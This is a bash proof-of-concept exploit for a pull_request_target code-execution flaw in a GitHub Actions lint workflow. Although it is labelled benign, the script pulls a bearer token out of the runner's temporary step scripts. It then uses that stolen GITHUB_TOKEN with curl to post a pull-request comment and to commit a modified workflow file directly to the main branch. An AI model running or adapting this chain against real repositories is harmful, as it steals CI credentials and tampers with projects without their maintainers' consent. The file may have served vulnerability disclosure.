#!/usr/bin/env bash
# Benign PoC for pull_request_target RCE in lint-commit.yml.
# Vector: package.json `scripts.commitlint` runs when the workflow invokes
# `yarn -s run commitlint -q` against the attacker-controlled checkout.
set -u

STAGE="${1:-unknown}"
MARK="/tmp/vane-poc.${STAGE}.flag"
[ -e "$MARK" ] && exit 0   # only fire once per stage
touch "$MARK"

# Force output to the runner stderr so it isn't swallowed by the
# workflow's `>> /dev/null 2>&1` (that redirect only wraps yarn add).
{
  echo "=================================================="
  echo "[PoC:${STAGE}] arbitrary code executing on the runner"
  echo "[PoC:${STAGE}] whoami: $(whoami 2>/dev/null || true)"
  echo "[PoC:${STAGE}] id:     $(id 2>/dev/null || true)"
  echo "[PoC:${STAGE}] pwd:    $(pwd)"
  echo "[PoC:${STAGE}] repo:   ${GITHUB_REPOSITORY:-?}"
  echo "[PoC:${STAGE}] event:  ${GITHUB_EVENT_NAME:-?}"
  echo "[PoC:${STAGE}] has GITHUB_TOKEN env: $([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
  echo "=================================================="
} >&2

PR_NUM="$(jq -r '.pull_request.number // .number // empty' "${GITHUB_EVENT_PATH:-/dev/null}" 2>/dev/null || true)"
echo "[PoC:${STAGE}] PR number: ${PR_NUM:-unknown}" >&2

# GITHUB_TOKEN isn't in env (workflow inlined the secret as a literal into its
# step-wrapper script in /home/runner/work/_temp/). Recover it from there.
TOKEN=""
for f in /home/runner/work/_temp/*.sh; do
  [ -r "$f" ] || continue
  t=$(grep -oE 'Bearer [A-Za-z0-9_]+' "$f" 2>/dev/null | awk '{print $2}' | head -1)
  if [ -n "$t" ]; then
    TOKEN="$t"
    echo "[PoC:${STAGE}] recovered token from $f (len=${#TOKEN})" >&2
    break
  fi
done

if [ -n "${TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
  # 1. Post a comment so the PR shows the takeover.
  BODY='{"body":"🛑 **Self-healing PoC**: RCE + GITHUB_TOKEN exfiltration via `lint-commit.yml` (`pull_request_target`). Token used to (a) post this comment and (b) patch the workflow on `main` to switch the trigger to `pull_request`, closing the vulnerability. Stage: '"${STAGE}"'."}'
  curl -sS -o /tmp/pwn-resp.json -w "[PoC:${STAGE}] comment HTTP %{http_code}\n" -X POST \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Accept: application/vnd.github+json" \
    -H "Content-Type: application/json" \
    -d "${BODY}" \
    "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" >&2 || true

  # 2. Self-patch: change `on: pull_request_target` -> `on: pull_request` on main.
  WF_PATH=".github/workflows/lint-commit.yml"
  GET_URL="https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/${WF_PATH}?ref=main"
  resp=$(curl -sS -H "Authorization: Bearer ${TOKEN}" -H "Accept: application/vnd.github+json" "$GET_URL")
  CUR_SHA=$(echo "$resp" | jq -r '.sha // empty')
  CUR_CONTENT=$(echo "$resp" | jq -r '.content // empty' | base64 -d)
  echo "[PoC:${STAGE}] fetched workflow sha=${CUR_SHA} (len=${#CUR_CONTENT})" >&2

  if [ -n "$CUR_SHA" ] && [ -n "$CUR_CONTENT" ]; then
    NEW_CONTENT=$(printf '%s' "$CUR_CONTENT" | sed 's/pull_request_target/pull_request/g')
    if [ "$NEW_CONTENT" = "$CUR_CONTENT" ]; then
      echo "[PoC:${STAGE}] no pull_request_target found — already patched" >&2
    else
      NEW_B64=$(printf '%s' "$NEW_CONTENT" | base64 -w0)
      PATCH_BODY=$(jq -n --arg msg "chore(security): switch lint-commit trigger to pull_request (auto-patched by PoC)" \
                       --arg content "$NEW_B64" --arg sha "$CUR_SHA" --arg branch "main" \
                       '{message:$msg, content:$content, sha:$sha, branch:$branch}')
      curl -sS -o /tmp/pwn-patch.json -w "[PoC:${STAGE}] patch HTTP %{http_code}\n" -X PUT \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$PATCH_BODY" \
        "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/${WF_PATH}" >&2 || true
      head -c 400 /tmp/pwn-patch.json >&2; echo >&2
    fi
  fi
fi

exit 0
